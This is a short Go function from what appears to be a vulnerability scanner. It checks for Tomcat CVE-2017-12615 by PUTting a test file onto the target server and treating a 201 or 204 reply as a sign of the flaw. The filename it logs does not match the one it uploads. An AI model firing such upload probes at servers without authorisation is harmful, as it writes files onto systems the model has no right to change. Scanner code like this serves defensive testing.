package tomcat

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

func CVE_2017_12615(url string) bool {
	if req, err := pkg.HttpRequset(url+"/vtset.txt", "PUT", "test", false, nil); err == nil {
		if req.StatusCode == 204 || req.StatusCode == 201 {
			pkg.GoPocLog(fmt.Sprintf("Found vuln Tomcat CVE_2017_12615|--\"%s/vtest.txt\"\n", url))
			return true
		}
	}
	return false
}
